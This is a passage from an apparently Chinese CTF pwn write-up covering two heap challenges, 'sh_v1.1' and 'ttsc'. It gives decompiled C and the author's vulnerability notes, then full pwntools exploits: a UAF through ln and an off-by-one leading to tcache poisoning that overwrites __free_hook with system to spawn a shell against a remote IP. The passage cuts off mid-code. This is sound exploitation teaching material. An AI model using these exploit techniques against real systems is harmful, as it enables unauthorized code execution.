class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    &#125;<br>LABEL_711:<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;file_name is NULL&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br></code></pre></td></tr></table></figure><p><strong>rm</strong></p><p>没有UAF，清空了fd指针，将文件标识改为0，即不存在</p><p>但是动态调试发现，从下一个chunk看，被rm的堆块，仍然存在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)qword_A0E8[<span class="hljs-number">6</span> * jj]);<br>qword_A0E8[<span class="hljs-number">6</span> * jj] = <span class="hljs-number">0LL</span>;<br>*((_QWORD *)&amp;unk_A0C0 + <span class="hljs-number">6</span> * jj) = <span class="hljs-number">0LL</span>;<br></code></pre></td></tr></table></figure><p><strong>gedit</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">read_line(qword_A0E8[<span class="hljs-number">6</span> * ii], <span class="hljs-number">0x200</span>uLL);<br></code></pre></td></tr></table></figure><p><strong>cat</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">79</span>; ++j )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(src, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;unk_A0C0 + <span class="hljs-number">48</span> * j + <span class="hljs-number">8</span>) )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( *((_QWORD *)&amp;unk_A0C0 + <span class="hljs-number">6</span> * j) == <span class="hljs-number">1LL</span> )<br>          &#123;<br>          <span class="hljs-built_in">puts</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)qword_A0E8[<span class="hljs-number">6</span> * j]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>          &#125;<br>        &#125;<br>        LABEL_223:<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO FILE&quot;</span>);<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      &#125;<br></code></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><strong>漏洞点：UAF</strong></p><p>思路像增删查改菜单题，漏洞像是offbynull，试验后发现不是，是UAF</p><p>在泄露libc和heap的过程中，慢慢动调</p><p>最后发现通过ln命令，可以实现类似UAF的效果</p><p>远程打不通后，尝试了下onegadget，条件都不满足</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r15] == NULL || r15 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>one_gadget = [libc_base+<span class="hljs-number">0xe3afe</span>, libc_base+<span class="hljs-number">0xe3b01</span>, libc_base+<span class="hljs-number">0xe3b04</span>]<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="hljs-comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br>banary = <span class="hljs-string">&quot;./sh_v1.1&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;121.40.89.206&#x27;</span><br>port = <span class="hljs-number">34883</span><br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------ menu   ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ls</span>():<br>ru(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;ls&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>(<span class="hljs-params">name1, name2</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;cp &#x27;</span>+ name1 +<span class="hljs-string">b&#x27; &#x27;</span>+ name2)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ln</span>(<span class="hljs-params">name1, name2</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;ln &#x27;</span>+ name1+ <span class="hljs-string">b&#x27; &#x27;</span>+ name2)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name ,con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;touch &#x27;</span>+ name)<br>sleep(<span class="hljs-number">0.1</span>)<br>sl(con)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">name</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;rm &#x27;</span> + name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">name</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;cat &#x27;</span> + name)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">name, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&gt;&gt;&gt;&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;gedit &#x27;</span> + name)<br>sleep(<span class="hljs-number">0.1</span>)<br>sl(con)<br><span class="hljs-comment">#------------------------  heap_base  ----------------------------</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>): <span class="hljs-comment">#0-9</span><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(i), <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):  <span class="hljs-comment">#0-6</span><br>free(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(i))<br><br>add(<span class="hljs-string">b&#x27;a10&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>show(<span class="hljs-string">b&#x27;a10&#x27;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0xCf0</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br>free(<span class="hljs-string">b&#x27;a10&#x27;</span>)<br><br><span class="hljs-comment">#------------------------ libc_base ----------------------------</span><br>free(<span class="hljs-string">b&#x27;a&#x27;</span>+ c_byte(<span class="hljs-number">7</span>))<br>free(<span class="hljs-string">b&#x27;a&#x27;</span>+ c_byte(<span class="hljs-number">8</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>, <span class="hljs-number">18</span>): <span class="hljs-comment">#11-17</span><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(i), <span class="hljs-string">b&#x27;&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;a18&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>show(<span class="hljs-string">b&#x27;a18&#x27;</span>)<br>malloc_hook = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">1104</span> - <span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;malloc_hook&#x27;</span>)<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;__malloc_hook&quot;</span>, malloc_hook)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> libc :<br>    <span class="hljs-built_in">print</span>(i) <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">libc6-amd64_2.31-6_i386</span><br><span class="hljs-string">libc6-amd64_2.31-0ubuntu9.2_i386</span><br><span class="hljs-string">libc6_2.31-6_amd64</span><br><span class="hljs-string">libc6_2.31-0ubuntu9.2_amd64</span><br><span class="hljs-string">libc6_2.31-8_amd64</span><br><span class="hljs-string">libc6_2.31-7_amd64</span><br><span class="hljs-string">libc6-amd64_2.31-9_i386</span><br><span class="hljs-string">libc6-amd64_2.31-7_i386</span><br><span class="hljs-string">libc6_2.31-9_amd64</span><br><span class="hljs-string">libc6-amd64_2.31-8_i386</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>libc.select_libc(<span class="hljs-number">3</span>)    <br>    <br>libc_base = malloc_hook - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#------------------------ pwn ----------------------------</span><br><span class="hljs-comment">#Gadget</span><br>system = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>free_hook = libc_base + libc.dump(<span class="hljs-string">&#x27;__free_hook&#x27;</span>)<br><br><span class="hljs-comment">#chunk17-11 + 18</span><br>ln(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(<span class="hljs-number">17</span>), <span class="hljs-string">b&#x27;b&#x27;</span>+c_byte(<span class="hljs-number">17</span>))<br>ln(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(<span class="hljs-number">16</span>), <span class="hljs-string">b&#x27;b&#x27;</span>+c_byte(<span class="hljs-number">16</span>))<br>ln(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(<span class="hljs-number">15</span>), <span class="hljs-string">b&#x27;b&#x27;</span>+c_byte(<span class="hljs-number">15</span>))<br><br>free(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(<span class="hljs-number">17</span>))<br>free(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(<span class="hljs-number">16</span>))<br>free(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(<span class="hljs-number">15</span>))<br><br>edit(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(<span class="hljs-number">11</span>), <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>edit(<span class="hljs-string">b&#x27;b&#x27;</span>+c_byte(<span class="hljs-number">16</span>), p64(free_hook))<br><br><br>add(<span class="hljs-string">b&#x27;fin1&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;fin2&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>add(<span class="hljs-string">b&#x27;fin3&#x27;</span>, p64(system))<br><br><br>free(<span class="hljs-string">b&#x27;a&#x27;</span>+c_byte(<span class="hljs-number">11</span>))<br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="2-ttsc"><a href="#2-ttsc" class="headerlink" title="2. ttsc"></a>2. ttsc</h2><h3 id="Scanf特性"><a href="#Scanf特性" class="headerlink" title="Scanf特性"></a>Scanf特性</h3><p><strong>scanf接受“-”字符，不会改变栈上数据情况</strong></p><p><strong>要泄露libc，必须控制版本为对应的Ubuntu GLIBC 2.27-3ubuntu1.6</strong></p><h3 id="Overlapping"><a href="#Overlapping" class="headerlink" title="Overlapping"></a>Overlapping</h3><p>存在一个off-by-one</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>, <span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment">#使得chunk1和chunk2合并为一个0x60大小的chunk</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p8(<span class="hljs-number">0x61</span>))<br><br><span class="hljs-comment">#释放0x60chunk，同时申请下来</span><br><span class="hljs-comment">#此时是一个0x60大小的chunk</span><br><span class="hljs-comment">#可以通过编号1控制其内容，通过编号2控制其下半部分</span><br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x58</span>)<br><br><span class="hljs-comment">#tcache poinsion</span><br><span class="hljs-comment">#chunk2 --&gt; free_hook</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x31</span>) + p64(free_hook) )<br><br><span class="hljs-comment">#free_hook --&gt; system</span><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x28</span>, p64(system))<br><br><span class="hljs-comment">#getshell</span><br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">最后也可以指向free_hook-0x8, 然后一步到位</span><br><span class="hljs-string">edit(1, b&#x27;a&#x27;*0x28 + p64(0x31) + p64(free_hook-0x8) )</span><br><span class="hljs-string"></span><br><span class="hljs-string">add(2, 0x28, &#x27;a&#x27;)</span><br><span class="hljs-string">add(3, 0x28, b&#x27;/bin/sh\x00&#x27; + p64(system))</span><br><span class="hljs-string"></span><br><span class="hljs-string">free(3)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="main-1"><a href="#main-1" class="headerlink" title="main"></a><strong>main</strong></h4><p>在进菜单前，有个输入name之类的函数，先分析菜单，再回头关注这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init_0();<br>  FMT();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    menu();<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v0);<br>    getchar();<br>    <span class="hljs-keyword">switch</span> ( v0 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        delete();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        Edit();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        Add();<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="menu"><a href="#menu" class="headerlink" title="menu"></a><strong>menu</strong></h4><p><strong>Add：index，size，content，大小&lt;&#x3D;0x78， chunk_num&#x3D;&#x3D; 0,1,2,3</strong> (可以先free再申请)</p><p><strong>delete：没有UAF，所以得找找其他漏洞，如数组越界，溢出</strong>（调试中发现，free后，pre_size为依旧为1，有问题的）</p><p><strong>Edit：使用三次后，close(1)，存在offbyone</strong></p><p>edit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Edit</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index?&quot;</span>);<br>  v1 = read_num();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">4</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;?&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;content:&quot;</span>);<br>  read_con(heap[v1], heap_size[v1]);<br>  <span class="hljs-keyword">if</span> ( !edit_num )<br>    close(<span class="hljs-number">1</span>);<br>  result = edit_num;<br>  <span class="hljs-keyword">if</span> ( edit_num )<br>    <span class="hljs-keyword">return</span> --edit_num;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">read_con</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">unsigned</span> __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf; <span class="hljs-comment">// [rsp+13h] [rbp-Dh] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; a2 &gt;= i; ++i ) <span class="hljs-comment">//i&lt;a2才合理</span><br>  &#123;<br>    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1uLL</span>);<br>    <span class="hljs-keyword">if</span> ( buf == <span class="hljs-number">10</span> )<br>      <span class="hljs-keyword">break</span>;<br>    *(_BYTE *)(a1 + i) = buf;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="FMT"><a href="#FMT" class="headerlink" title="FMT"></a><strong>FMT</strong></h4><p>泄露libc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">FMT</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;aaaaaaaaaaaaaaaaaa&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bbbbbbbbbbbbbbbbbbb&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;cccccccccccccccccccc&quot;</span>);<br>  BUG();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><br>__int64 <span class="hljs-title function_">BUG</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-60h] BYREF</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-5Ch] BYREF</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-58h]</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+10h] [rbp-50h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-48h]</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+20h] [rbp-40h]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+28h] [rbp-38h]</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+30h] [rbp-30h]</span><br>  __int64 v9; <span class="hljs-comment">// [rsp+38h] [rbp-28h]</span><br>  __int64 buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-20h] BYREF</span><br><br>  buf[<span 